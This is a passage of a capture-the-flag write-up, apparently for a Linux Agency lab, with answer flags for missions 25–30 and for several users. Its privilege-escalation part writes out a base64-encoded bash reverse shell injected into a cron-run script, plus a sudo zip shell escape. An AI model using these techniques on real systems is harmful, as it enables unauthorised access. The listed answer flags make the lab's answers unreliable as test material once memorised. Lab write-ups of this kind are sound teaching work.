      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission25{61b93637881c87c71f220033b22a921b}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">We have a binary that won't tell us much and we won't reverse it so let's try to see if there is a trace of the source code in the editor history.</text:p>
      <table:table table:name="Table34" table:style-name="Table34">
        <table:table-column table:style-name="Table34.A"/>
        <table:table-column table:style-name="Table34.B"/>
        <table:table-row table:style-name="TableLine94402688882240">
          <table:table-cell table:style-name="Table34.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="Preformatted_20_Text">13</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>14</text:p>
            <text:p text:style-name="P1">15</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table34.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission24@linuxagency:~$ file bribe</text:p>
            <text:p text:style-name="Preformatted_20_Text">bribe: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=006516d8c62bb8a5f5a41595ce4529d4bcb159b8, not stripped</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission24@linuxagency:~$ ./bribe</text:p>
            <text:p text:style-name="Preformatted_20_Text">There is a guy who is smuggling flags</text:p>
            <text:p text:style-name="Preformatted_20_Text">Bribe this guy to get the flag</text:p>
            <text:p text:style-name="Preformatted_20_Text">Put some money in his pocket to get the flag</text:p>
            <text:p text:style-name="Preformatted_20_Text">Words are not the price for your flag</text:p>
            <text:p text:style-name="Preformatted_20_Text">Give Me money Man!!!</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission24@linuxagency:~$ grep mission .viminfo</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>printf("mission25{edited}\n");</text:p>
            <text:p text:style-name="P1">|3,0,4,1,1,0,1610305123," <text:s text:c="6"/>printf(\"mission25{edited}\\n\");"</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission26 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission26{cb6ce977c16c57f509e9f8462a120f00}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">We can't use common commands because our PATH is not set:</text:p>
      <table:table table:name="Table35" table:style-name="Table35">
        <table:table-column table:style-name="Table35.A"/>
        <table:table-column table:style-name="Table35.B"/>
        <table:table-row table:style-name="TableLine94402689342848">
          <table:table-cell table:style-name="Table35.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="P1">4</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table35.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission25@linuxagency:~$ ls -lhA</text:p>
            <text:p text:style-name="Preformatted_20_Text">bash: ls: No such file or directory</text:p>
            <text:p text:style-name="P1">mission25@linuxagency:~$ echo $PATH</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">We can still use built-in shell commands as echo or alias. So we can set our PATH.</text:p>
      <table:table table:name="Table36" table:style-name="Table36">
        <table:table-column table:style-name="Table36.A"/>
        <table:table-column table:style-name="Table36.B"/>
        <table:table-row table:style-name="TableLine94402689356784">
          <table:table-cell table:style-name="Table36.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="P1">10</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table36.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission25@linuxagency:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission25@linuxagency:~$ ls -lhA</text:p>
            <text:p text:style-name="Preformatted_20_Text">total 16K</text:p>
            <text:p text:style-name="Preformatted_20_Text">lrwxrwxrwx 1 mission25 mission25 <text:s text:c="3"/>9 Jan 12 04:02 .bash_history -&gt; /dev/null</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 mission25 mission25 3.7K Jan 12 04:02 .bashrc</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 mission25 mission25 <text:s text:c="2"/>44 Jan 12 04:02 flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">drwxr-xr-x 3 mission25 mission25 4.0K Jan 12 04:02 .local</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 mission25 mission25 <text:s/>807 Jan 12 04:02 .profile</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission25@linuxagency:~$ cat flag.txt</text:p>
            <text:p text:style-name="P1">mission26{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission27 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission27{444d29b932124a48e7dddc0595788f4d}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">We have a jpeg image but we can use <text:span text:style-name="Source_20_Text">strings</text:span> to check is there a hidden string in it. By using option <text:span text:style-name="Source_20_Text">-n</text:span> we can tell it to only display strings larger than 20 bytes.</text:p>
      <table:table table:name="Table37" table:style-name="Table37">
        <table:table-column table:style-name="Table37.A"/>
        <table:table-column table:style-name="Table37.B"/>
        <table:table-row table:style-name="TableLine94402689384976">
          <table:table-cell table:style-name="Table37.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="P1">3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table37.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission26@linuxagency:~$ strings -n 20 flag.jpg</text:p>
            <text:p text:style-name="Preformatted_20_Text">-mission27{edited}</text:p>
            <text:p text:style-name="P1">((((((((((((((((((((((((((((((((((((((((((((((((((</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission28 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission28{03556f8ca983ef4dc26d2055aef9770f}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">Interestingly enough, the file <text:span text:style-name="Source_20_Text">flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz</text:span> is seen as a gzip file by <text:span text:style-name="Source_20_Text">file</text:span> but is seen as a GIF by <text:span text:style-name="Source_20_Text">less</text:span> which displays us the following magic byte + the flag:</text:p>
      <table:table table:name="Table38" table:style-name="Table38">
        <table:table-column table:style-name="Table38.A"/>
        <table:table-column table:style-name="Table38.B"/>
        <table:table-row table:style-name="TableLine94402689398192">
          <table:table-cell table:style-name="Table38.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="P1">3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table38.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission27@linuxagency:~$ less flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz</text:p>
            <text:p text:style-name="Preformatted_20_Text">GIF87a</text:p>
            <text:p text:style-name="P1">mission28{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">We can also decompress it and apply strings:</text:p>
      <table:table table:name="Table39" table:style-name="Table39">
        <table:table-column table:style-name="Table39.A"/>
        <table:table-column table:style-name="Table39.B"/>
        <table:table-row table:style-name="TableLine94402689414944">
          <table:table-cell table:style-name="Table39.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>5</text:p>
            <text:p text:style-name="P1">6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table39.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission27@linuxagency:~$ gunzip flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission27@linuxagency:~$ ls</text:p>
            <text:p text:style-name="Preformatted_20_Text">flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission27@linuxagency:~$ strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>GIF87a</text:p>
            <text:p text:style-name="P1">mission28{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission29 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission29{8192b05d8b12632586e25be74da2fff1}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">Here the shell of the user is a ruby interpreter. We just need to make spawn a shell:</text:p>
      <table:table table:name="Table40" table:style-name="Table40">
        <table:table-column table:style-name="Table40.A"/>
        <table:table-column table:style-name="Table40.B"/>
        <table:table-row table:style-name="TableLine94402689435712">
          <table:table-cell table:style-name="Table40.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="P1">10</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table40.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission27@linuxagency:~$ su mission28</text:p>
            <text:p text:style-name="Preformatted_20_Text">Password:</text:p>
            <text:p text:style-name="Preformatted_20_Text">irb(main):001:0&gt; exec '/bin/bash'</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission28@linuxagency:/home/mission27$ cd</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission28@linuxagency:~$ ls -lh</text:p>
            <text:p text:style-name="Preformatted_20_Text">total 16K</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 mission28 mission28 8.8K Jan 12 04:02 examples.desktop</text:p>
            <text:p text:style-name="Preformatted_20_Text">-r-------- 1 mission28 mission28 <text:s text:c="2"/>44 Jan 12 04:02 txt.galf</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission28@linuxagency:~$ cat txt.galf</text:p>
            <text:p text:style-name="P1">}1fff2ad47eb52e68523621b8d50b2918{92noissim</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">We have the flag displayed the reversed way. I used <text:a xlink:type="simple" xlink:href="https://github.com/noraj/ctf-party/" office:target-frame-name="_blank" xlink:show="new" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">ctf-party</text:a> to reverse it:</text:p>
      <table:table table:name="Table41" table:style-name="Table41">
        <table:table-column table:style-name="Table41.A"/>
        <table:table-column table:style-name="Table41.B"/>
        <table:table-row table:style-name="TableLine94402689461568">
          <table:table-cell table:style-name="Table41.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="P1">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table41.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">irb(main):001:0&gt; '}1fff2ad47eb52e68523621b8d50b2918{92noissim'.reverse</text:p>
            <text:p text:style-name="P1">=&gt; "mission29{eited}"</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission30 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission30{d25b4c9fac38411d2fcb4796171bda6e}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">There is a folder of a web app: <text:span text:style-name="Source_20_Text">bludit</text:span>, we need to find a password. Let's use a recursive grep for that:</text:p>
      <table:table table:name="Table42" table:style-name="Table42">
        <table:table-column table:style-name="Table42.A"/>
        <table:table-column table:style-name="Table42.B"/>
        <table:table-row table:style-name="TableLine94402689475984">
          <table:table-cell table:style-name="Table42.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="P1">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table42.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission29@linuxagency:~$ grep -rn mission30 bludit/</text:p>
            <text:p text:style-name="P1">bludit/.htpasswd:1:mission30{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is viktor's Flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">viktor{b52c60124c0f8f85fe647021122b3d9a}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">We have a git repository in the folder <text:span text:style-name="Source_20_Text">Escalator</text:span>:</text:p>
      <table:table table:name="Table43" table:style-name="Table43">
        <table:table-column table:style-name="Table43.A"/>
        <table:table-column table:style-name="Table43.B"/>
        <table:table-row table:style-name="TableLine94402689490048">
          <table:table-cell table:style-name="Table43.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="P1">13</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table43.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission30@linuxagency:~$ cd Escalator/</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission30@linuxagency:~/Escalator$ git --no-pager log</text:p>
            <text:p text:style-name="Preformatted_20_Text">commit 24cbf44a9cb0e65883b3f76ef5533a2b2ef96497 (HEAD -&gt; master, origin/master)</text:p>
            <text:p text:style-name="Preformatted_20_Text">Author: root &lt;root@Xyan1d3&gt;</text:p>
            <text:p text:style-name="Preformatted_20_Text">Date: <text:s text:c="2"/>Mon Jan 11 15:37:56 2021 +0530</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>My 1st python Script</text:p>
            <text:p text:style-name="Preformatted_20_Text">commit e0b807dbeb5aba190d6307f072abb60b34425d44</text:p>
            <text:p text:style-name="Preformatted_20_Text">Author: root &lt;root@Xyan1d3&gt;</text:p>
            <text:p text:style-name="Preformatted_20_Text">Date: <text:s text:c="2"/>Mon Jan 11 15:36:40 2021 +0530</text:p>
            <text:p text:style-name="P1"><text:s text:c="4"/>Your flag is viktor{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">By displaying the commit history, the flag is in a commit title.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="Privilege-Escalation"/><text:soft-page-break/>Privilege Escalation<text:a xlink:type="simple" xlink:href="https://blog.raw.pm/en/TryHackMe-Linux-Agency-write-up/#Privilege-Escalation" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">#</text:a></text:h>
      <text:p text:style-name="Quotations">What is dalia's flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">dalia{4a94a7a7bb4a819a63a33979926c77dc}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">It seems there is a root cron job.</text:p>
      <table:table table:name="Table44" table:style-name="Table44">
        <table:table-column table:style-name="Table44.A"/>
        <table:table-column table:style-name="Table44.B"/>
        <table:table-row table:style-name="TableLine94402689522688">
          <table:table-cell table:style-name="Table44.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="Preformatted_20_Text">13</text:p>
            <text:p text:style-name="Preformatted_20_Text">14</text:p>
            <text:p text:style-name="Preformatted_20_Text">15</text:p>
            <text:p text:style-name="Preformatted_20_Text">16</text:p>
            <text:p text:style-name="P1">17</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table44.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">viktor@linuxagency:~$ cat /etc/crontab</text:p>
            <text:p text:style-name="Preformatted_20_Text"># /etc/crontab: system-wide crontab</text:p>
            <text:p text:style-name="Preformatted_20_Text"># Unlike any other crontab you don't have to run the `crontab'</text:p>
            <text:p text:style-name="Preformatted_20_Text"># command to install the new version when you edit this file</text:p>
            <text:p text:style-name="Preformatted_20_Text"># and files in /etc/cron.d. These files also have username fields,</text:p>
            <text:p text:style-name="Preformatted_20_Text"># that none of the other crontabs do.</text:p>
            <text:p text:style-name="Preformatted_20_Text">SHELL=/bin/sh</text:p>
            <text:p text:style-name="Preformatted_20_Text">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</text:p>
            <text:p text:style-name="Preformatted_20_Text"># m h dom mon dow user <text:s/>command</text:p>
            <text:p text:style-name="Preformatted_20_Text">17 * <text:s text:c="3"/>* * * <text:s text:c="2"/>root <text:s text:c="3"/>cd / &amp;&amp; run-parts --report /etc/cron.hourly</text:p>
            <text:p text:style-name="Preformatted_20_Text">25 6 <text:s text:c="3"/>* * * <text:s text:c="2"/>root <text:s text:c="3"/>test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</text:p>
            <text:p text:style-name="Preformatted_20_Text">47 6 <text:s text:c="3"/>* * 7 <text:s text:c="2"/>root <text:s text:c="3"/>test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</text:p>
            <text:p text:style-name="Preformatted_20_Text">52 6 <text:s text:c="3"/>1 * * <text:s text:c="2"/>root <text:s text:c="3"/>test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</text:p>
            <text:p text:style-name="Preformatted_20_Text">* <text:s/>* <text:s text:c="3"/>* * * <text:s text:c="2"/>dalia <text:s text:c="2"/>sleep 30;/opt/scripts/47.sh</text:p>
            <text:p text:style-name="P1">* <text:s/>* <text:s text:c="3"/>* * * <text:s text:c="2"/>root <text:s text:c="3"/>echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d &gt; /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Every minute the script <text:span text:style-name="Source_20_Text">/opt/scripts/47.sh</text:span> will be overwritten and it will be executed after 30 seconds. So if we put a reverse shell in it we will obtain a dalia shell or copy a SUID file.</text:p>
      <table:table table:name="Table45" table:style-name="Table45">
        <table:table-column table:style-name="Table45.A"/>
        <table:table-column table:style-name="Table45.B"/>
        <table:table-row table:style-name="TableLine94402689561088">
          <table:table-cell table:style-name="Table45.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="P1">6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table45.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ cat eop.sh</text:p>
            <text:p text:style-name="Preformatted_20_Text">#!/bin/bash</text:p>
            <text:p text:style-name="Preformatted_20_Text">bash -i &gt;&amp; /dev/tcp/127.0.0.1/9999 0&gt;&amp;1</text:p>
            <text:p text:style-name="Preformatted_20_Text">$ cat eop.sh | base64 -w 0</text:p>
            <text:p text:style-name="P1">IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTk5OSAwPiYx</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Then on the target machine we inject our payload in the script used by teh cron job:</text:p>
      <table:table table:name="Table46" table:style-name="Table46">
        <table:table-column table:style-name="Table46.A"/>
        <table:table-column table:style-name="Table46.B"/>
        <table:table-row table:style-name="TableLine94402689560256">
          <table:table-cell table:style-name="Table46.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="P1">8</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table46.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">viktor@linuxagency:~$ echo 'IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTk5OSAwPiYx' | base64 -d &gt; /opt/scripts/47.sh</text:p>
            <text:p text:style-name="Preformatted_20_Text">viktor@linuxagency:~$ netcat -nlp 9999</text:p>
            <text:p text:style-name="Preformatted_20_Text">id</text:p>
            <text:p text:style-name="Preformatted_20_Text">bash: cannot set terminal process group (3389): Inappropriate ioctl for device</text:p>
            <text:p text:style-name="Preformatted_20_Text">bash: no job control in this shell</text:p>
            <text:p text:style-name="Preformatted_20_Text">dalia@linuxagency:~$ id</text:p>
            <text:p text:style-name="Preformatted_20_Text">uid=1034(dalia) gid=1034(dalia) groups=1034(dalia)</text:p>
            <text:p text:style-name="P1">dalia@linuxagency:~$</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is silvio's flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">silvio{657b4d058c03ab9988875bc937f9c2ef}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">dalia can execute the <text:span text:style-name="Source_20_Text">zip</text:span> command as silvio:</text:p>
      <table:table table:name="Table47" table:style-name="Table47">
        <table:table-column table:style-name="Table47.A"/>
        <table:table-column table:style-name="Table47.B"/>
        <table:table-row table:style-name="TableLine94402689602400">
          <table:table-cell table:style-name="Table47.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="P1"><text:soft-page-break/>7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table47.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">dalia@linuxagency:~$ sudo -l</text:p>
            <text:p text:style-name="Preformatted_20_Text">Matching Defaults entries for dalia on localhost:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>env_reset, env_file=/etc/sudoenv, mail_badpass,</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</text:p>
            <text:p text:style-name="Preformatted_20_Text">User dalia may run the following commands on localhost:</text:p>
            <text:p text:style-name="P1"><text:s text:c="4"/>(silvio) NOPASSWD: /usr/bin/zip</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">zip can be used to execute commands:</text:p>
      <table:table table:name="Table48" table:style-name="Table48">
        <table:table-column table:style-name="Table48.A"/>
        <table:table-column table:style-name="Table48.B"/>
        <table:table-row table:style-name="TableLine94402689601440">
          <table:table-cell table:style-name="Table48.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="P1">8</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table48.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ gtfoblookup linux sudo zip</text:p>
            <text:p text:style-name="Preformatted_20_Text">zip:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>sudo:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Code: TF=$(mktemp -u)</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="14"/>sudo zip $TF /etc/hosts -T -TT 'sh #'</text:p>
            <text:p text:style-name="P1"><text:s text:c="14"/>sudo rm $TF</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Let's do this:</text:p>
      <table:table table:name="Table49" table:style-name="Table49">
        <table:table-column table:style-name="Table49.A"/>
        <table:table-column table:style-name="Table49.B"/>
        <table:table-row table:style-name="TableLine94402688570400">
          <table:table-cell table:style-name="Table49.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="Preformatted_20_Text">13</text:p>
            <text:p text:style-name="Preformatted_20_Text">14</text:p>
            <text:p text:style-name="Preformatted_20_Text">15</text:p>
            <text:p text:style-name="Preformatted_20_Text">16</text:p>
            <text:p text:style-name="Preformatted_20_Text">17</text:p>
            <text:p text:style-name="Preformatted_20_Text">18</text:p>
            <text:p text:style-name="P1">19</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table49.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">dalia@linuxagency:~$ TF=$(mktemp -u)</text:p>
